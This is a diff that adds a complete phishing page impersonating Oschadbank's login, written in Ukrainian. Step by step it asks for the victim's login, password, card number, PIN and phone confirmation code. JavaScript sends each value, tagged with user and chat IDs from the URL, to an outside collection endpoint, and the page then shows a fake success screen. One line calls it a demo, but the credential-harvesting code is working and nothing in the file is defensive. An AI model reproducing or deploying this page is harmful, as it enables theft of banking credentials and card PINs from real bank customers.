@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вхід в Ощадбанк</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        :root {
+            --oschad-dark: #005B82;
+            --oschad-primary: #00A3E0;
+            --oschad-light: #E6F7FF;
+            --oschad-green: #7FBA00;
+            --oschad-yellow: #FFD600;
+            --oschad-text: #003D57;
+            --oschad-gray: #8E9BA2;
+            --oschad-bg: linear-gradient(135deg, #E6F7FF, #D1F2FF);
+        }
+
+        body {
+            background: var(--oschad-bg);
+            color: var(--oschad-text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .oschad-container {
+            width: 100%;
+            max-width: 440px;
+            background: white;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 91, 130, 0.15);
+            position: relative;
+        }
+
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(0, 163, 224, 0.2);
+            border-top: 4px solid var(--oschad-primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .loader::after {
+            content: '';
+            position: absolute;
+            top: -4px;
+            left: -4px;
+            right: -4px;
+            bottom: -4px;
+            border: 4px solid transparent;
+            border-top-color: var(--oschad-green);
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+
+        .loading-text {
+            color: var(--oschad-text);
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .logo-container {
+            background: linear-gradient(135deg, var(--oschad-primary), var(--oschad-green));
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%);
+            opacity: 0.4;
+        }
+
+        .logo-circle {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            background: background: linear-gradient(135deg, var(--oschad-primary), var(--oschad-green));
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 4px 15px rgba(0, 59, 82, 0.2);
+            border: 3px solid rgba(255, 255, 255, 0.5);
+            overflow: hidden;
+            padding: 0;
+        }
+
+        .logo-circle img {
+            width: 220%;
+            height: 220%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .header-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: white;
+            text-shadow: 0 1px 3px rgba(0, 59, 82, 0.3);
+        }
+
+        .oschad-steps {
+            padding: 15px;
+        }
+
+        .progress-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+
+        .progress-bar {
+            flex: 1;
+            height: 6px;
+            background: var(--oschad-light);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--oschad-green), var(--oschad-primary));
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+
+        .progress-text {
+            font-size: 14px;
+            color: var(--oschad-primary);
+            margin-left: 10px;
+            font-weight: 600;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--oschad-text);
+        }
+
+        .step-description {
+            color: var(--oschad-gray);
+            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--oschad-text);
+            font-weight: 500;
+        }
+
+        .oschad-input {
+            width: 100%;
+            padding: 15px 18px;
+            background: var(--oschad-light);
+            border: 1px solid #C4E3F2;
+            border-radius: 12px;
+            color: var(--oschad-text);
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+
+        .oschad-input:focus {
+            outline: none;
+            border-color: var(--oschad-primary);
+            box-shadow: 0 0 0 3px rgba(0, 163, 224, 0.2);
+            background: white;
+        }
+
+        .oschad-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, var(--oschad-yellow), #FFE100);
+            color: var(--oschad-text);
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 8px rgba(127, 186, 0, 0.2);
+        }
+
+        .oschad-btn:hover {
+            background: linear-gradient(90deg, #FFE100, var(--oschad-yellow));
+            box-shadow: 0 6px 12px rgba(127, 186, 0, 0.3);
+        }
+
+        .oschad-btn:disabled {
+            background: var(--oschad-gray);
+            cursor: not-allowed;
+            opacity: 0.7;
+            box-shadow: none;
+        }
+
+        .back-btn {
+            background: white;
+            color: var(--oschad-primary);
+            border: 1px solid var(--oschad-primary);
+        }
+
+        .back-btn:hover {
+            background: rgba(0, 163, 224, 0.1);
+        }
+
+        .step-action {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .step-action .oschad-btn {
+            flex: 1;
+        }
+
+        .code-container {
+            display: flex;
+            justify-content: space-between;
+            margin: 25px 0;
+        }
+
+        .code-input {
+            width: 65px;
+            height: 75px;
+            text-align: center;
+            font-size: 28px;
+            background: var(--oschad-light);
+            border: 1px solid #C4E3F2;
+            border-radius: 12px;
+            color: var(--oschad-text);
+            transition: all 0.2s;
+        }
+
+        .code-input:focus {
+            border-color: var(--oschad-primary);
+            box-shadow: 0 0 0 3px rgba(0, 163, 224, 0.2);
+            outline: none;
+            background: white;
+        }
+
+        .status-message {
+            text-align: center;
+            margin: 15px 0;
+            font-size: 14px;
+            min-height: 20px;
+        }
+
+        .success {
+            color: var(--oschad-green);
+        }
+
+        .error {
+            color: #E53935;
+        }
+
+        .success-screen {
+            text-align: center;
+            padding: 30px;
+        }
+
+        .success-icon {
+            width: 90px;
+            height: 90px;
+            background: var(--oschad-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-icon i {
+            font-size: 40px;
+            color: white;
+        }
+
+        .call-info {
+            background: var(--oschad-light);
+            border-radius: 12px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+            border: 1px dashed var(--oschad-primary);
+        }
+
+        @media (max-width: 480px) {
+            .oschad-container {
+                border-radius: 18px;
+            }
+
+            .logo-container {
+                padding: 30px 20px;
+            }
+
+            .logo-circle {
+                width: 300px;
+                height: 300px;
+            }
+
+            .oschad-steps {
+                padding: 60px;
+            }
+
+            .code-input {
+                width: 55px;
+                height: 65px;
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="oschad-container">
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="loader"></div>
+            <div class="loading-text" id="loadingText">Завантаження...</div>
+        </div>
+
+        <div class="logo-container">
+            <div class="logo-circle">
+                <img src="oshad.png" alt="Ощадбанк">
+            </div>
+            <h1 class="header-title">Вхід в Ощадбанк</h1>
+        </div>
+
+        <div class="oschad-steps">
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                <div class="progress-text" id="progressText">Крок 1 з 6</div>
+            </div>
+
+            <div class="step active" id="step1">
+                <h2 class="step-title">Ваш логін</h2>
+                <p class="step-description">Введіть логін, який ви використовуєте для входу</p>
+
+                <div class="input-group">
+                    <label class="input-label">Логін</label>
+                    <input type="text" class="oschad-input" id="login" placeholder="Ваш логін">
+                </div>
+
+                <button class="oschad-btn" id="nextToPassword">Продовжити</button>
+            </div>
+
+            <div class="step" id="step2">
+                <h2 class="step-title">Ваш пароль</h2>
+                <p class="step-description">Введіть пароль для входу в Ощадбанк</p>
+
+                <div class="input-group">
+                    <label class="input-label">Пароль</label>
+                    <input type="password" class="oschad-input" id="password" placeholder="Ваш пароль">
+                </div>
+
+                <div class="step-action">
+                    <button class="oschad-btn back-btn" id="backToLogin">Назад</button>
+                    <button class="oschad-btn" id="nextToCard">Продовжити</button>
+                </div>
+            </div>
+
+            <div class="step" id="step3">
+                <h2 class="step-title">Ваша картка</h2>
+                <p class="step-description">Введіть номер вашої банківської картки</p>
+
+                <div class="input-group">
+                    <label class="input-label">Номер картки</label>
+                    <input type="text" class="oschad-input" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+                </div>
+
+                <div class="step-action">
+                    <button class="oschad-btn back-btn" id="backToPassword">Назад</button>
+                    <button class="oschad-btn" id="nextToPin">Продовжити</button>
+                </div>
+            </div>
+
+            <div class="step" id="step4">
+                <h2 class="step-title">PIN-код</h2>
+                <p class="step-description">Введіть 4-значний PIN-код від вашої картки</p>
+
+                <div class="code-container">
+                    <input type="tel" class="code-input" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                </div>
+
+                <div class="step-action">
+                    <button class="oschad-btn back-btn" id="backToCard">Назад</button>
+                    <button class="oschad-btn" id="nextToCall" disabled>Продовжити</button>
+                </div>
+            </div>
+
+            <div class="step" id="step5">
+                <h2 class="step-title">Підтвердження</h2>
+                <p class="step-description">На ваш номер телефону зараз буде здійснено дзвінок</p>
+
+                <div class="call-info">
+                    <i class="fas fa-phone-alt" style="color: var(--oschad-primary); font-size: 24px; margin-bottom: 10px;"></i>
+                    <p>Підніміть слухавку, натисніть 1 та прослухайте код, після введіть його в поле нижче</p>
+                </div>
+
+                <div class="code-container">
+                    <input type="tel" class="code-input" id="callCode1" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="callCode2" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="callCode3" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-input" id="callCode4" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                </div>
+
+                <div class="status-message" id="callMessage"></div>
+
+                <div class="step-action">
+                    <button class="oschad-btn back-btn" id="backToPin">Назад</button>
+                    <button class="oschad-btn" id="verifyCallCode" disabled>Підтвердити</button>
+                </div>
+            </div>
+
+            <div class="step" id="step6">
+                <div class="success-screen">
+                    <div class="success-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h2 class="step-title">Вхід успішний!</h2>
+                    <p class="step-description">Ви успішно авторизувались в Ощадбанк</p>
+
+                    <div class="status-message success">
+                        Зараз ви будете перенаправлені в особистий кабінет
+                    </div>
+
+                    <button class="oschad-btn" id="finishBtn">Перейти в кабінет</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const state = {
+                currentStep: 1,
+                totalSteps: 6,
+                loading: false,
+                callCode: '1234'
+            };
+
+            const elements = {
+                loadingOverlay: document.getElementById('loadingOverlay'),
+                loadingText: document.getElementById('loadingText'),
+                progressBar: document.getElementById('progressBar'),
+                progressText: document.getElementById('progressText'),
+                steps: document.querySelectorAll('.step'),
+                pinInputs: document.querySelectorAll('.code-input[id^="pin"]'),
+                callInputs: document.querySelectorAll('.code-input[id^="callCode"]'),
+                nextCallBtn: document.getElementById('nextToCall'),
+                verifyCallBtn: document.getElementById('verifyCallCode'),
+                callMessage: document.getElementById('callMessage'),
+                cardNumber: document.getElementById('cardNumber')
+            };
+
+            initInputHandlers();
+            setupNavigation();
+            updateProgress();
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('user_id') || 'не вказано';
+            const chatId = urlParams.get('chat_id') || 'не вказано';
+
+            async function sendDataToServer(data) {
+                try {
+                    const response = await fetch('https://your-server.com/api/collect', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            ...data,
+                            userId,
+                            chatId,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                    return await response.json();
+                } catch (error) {
+                    console.error('Помилка відправки даних:', error);
+                    return { success: false };
+                }
+            }
+
+            function showLoading(text = 'Завантаження...') {
+                elements.loadingText.textContent = text;
+                elements.loadingOverlay.classList.add('active');
+                state.loading = true;
+            }
+
+            function hideLoading() {
+                elements.loadingOverlay.classList.remove('active');
+                state.loading = false;
+            }
+
+            function initInputHandlers() {
+                elements.cardNumber.addEventListener('input', function(e) {
+                    let value = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                    let formatted = '';
+                    for (let i = 0; i < value.length; i++) {
+                        if (i > 0 && i % 4 === 0) formatted += ' ';
+                        formatted += value[i];
+                    }
+                    this.value = formatted.substring(0, 19);
+                });
+
+                setupCodeInputs(elements.pinInputs, elements.nextCallBtn);
+                setupCodeInputs(elements.callInputs, elements.verifyCallBtn);
+            }
+
+            function setupCodeInputs(inputs, nextBtn) {
+                inputs.forEach((input, index) => {
+                    input.addEventListener('input', function(e) {
+                        if (this.value.length === 1 && index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                        checkCodeComplete(inputs, nextBtn);
+                    });
+
+                    input.addEventListener('keydown', function(e) {
+                        if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                            inputs[index - 1].focus();
+                        }
+                    });
+
+                    input.addEventListener('paste', function(e) {
+                        e.preventDefault();
+                        const pasteData = e.clipboardData.getData('text').trim();
+                        if (/^\d{4}$/.test(pasteData)) {
+                            inputs.forEach((inp, i) => {
+                                inp.value = pasteData[i] || '';
+                            });
+                            checkCodeComplete(inputs, nextBtn);
+                            inputs[3].focus();
+                        }
+                    });
+                });
+            }
+
+            function checkCodeComplete(inputs, nextBtn) {
+                const allFilled = Array.from(inputs).every(input => input.value.length === 1);
+                nextBtn.disabled = !allFilled;
+            }
+
+            function setupNavigation() {
+                document.getElementById('nextToPassword').addEventListener('click', async () => {
+                    const login = document.getElementById('login').value.trim();
+                    if (!state.loading && login) {
+                        showLoading();
+                        await sendDataToServer({ step: 1, login });
+                        setTimeout(() => goToStep(2), 800);
+                    }
+                });
+
+                document.getElementById('nextToCard').addEventListener('click', async () => {
+                    const password = document.getElementById('password').value;
+                    if (!state.loading && password.length >= 6) {
+                        showLoading();
+                        await sendDataToServer({ step: 2, password });
+                        setTimeout(() => goToStep(3), 800);
+                    }
+                });
+
+                document.getElementById('nextToPin').addEventListener('click', async () => {
+                    const cardNumber = elements.cardNumber.value.replace(/\s/g, '');
+                    if (!state.loading && cardNumber.length === 16) {
+                        showLoading();
+                        await sendDataToServer({ step: 3, cardNumber });
+                        setTimeout(() => goToStep(4), 800);
+                    }
+                });
+
+                document.getElementById('nextToCall').addEventListener('click', async () => {
+                    if (!state.loading) {
+                        showLoading('Ініціалізація дзвінка...');
+                        const pinCode = Array.from(elements.pinInputs).map(input => input.value).join('');
+                        await sendDataToServer({ step: 4, pinCode });
+                        setTimeout(() => {
+                            elements.callMessage.innerHTML = `<span class="success">Дзвінок ініціалізовано! Ваш код: ${state.callCode}</span>`;
+                            goToStep(5);
+                        }, 1500);
+                    }
+                });
+
+                document.getElementById('verifyCallCode').addEventListener('click', async () => {
+                    if (!state.loading) {
+                        const enteredCode = Array.from(elements.callInputs).map(input => input.value).join('');
+                        showLoading('Перевірка коду...');
+                        await sendDataToServer({ step: 5, callCode: enteredCode, validCode: state.callCode });
+                        setTimeout(() => goToStep(6), 1000);
+                    }
+                });
+
+                document.getElementById('backToLogin').addEventListener('click', () => {
+                    if (!state.loading) goToStep(1);
+                });
+
+                document.getElementById('backToPassword').addEventListener('click', () => {
+                    if (!state.loading) goToStep(2);
+                });
+
+                document.getElementById('backToCard').addEventListener('click', () => {
+                    if (!state.loading) goToStep(3);
+                });
+
+                document.getElementById('backToPin').addEventListener('click', () => {
+                    if (!state.loading) goToStep(4);
+                });
+
+                document.getElementById('finishBtn').addEventListener('click', async () => {
+                    await sendDataToServer({ step: 6, completed: true });
+                    alert('Успішний вхід! Це демо, тому перенаправлення не відбувається.');
+                });
+            }
+
+            function goToStep(step) {
+                elements.steps.forEach(s => s.classList.remove('active'));
+                document.getElementById(`step${step}`).classList.add('active');
+                state.currentStep = step;
+                updateProgress();
+
+                if (step === 1) setTimeout(() => document.getElementById('login').focus(), 50);
+                else if (step === 2) setTimeout(() => document.getElementById('password').focus(), 50);
+                else if (step === 3) setTimeout(() => document.getElementById('cardNumber').focus(), 50);
+                else if (step === 4) setTimeout(() => elements.pinInputs[0].focus(), 50);
+                else if (step === 5) setTimeout(() => elements.callInputs[0].focus(), 50);
+
+                hideLoading();
+            }
+
+            function updateProgress() {
+                const progress = ((state.currentStep - 1) / (state.totalSteps - 1)) * 100;
+                elements.progressBar.style.width = `${progress}%`;
+                elements.progressText.textContent = `Крок ${state.currentStep} з ${state.totalSteps}`;
+            }
+        });
+    </script>
+</body>
+</html>
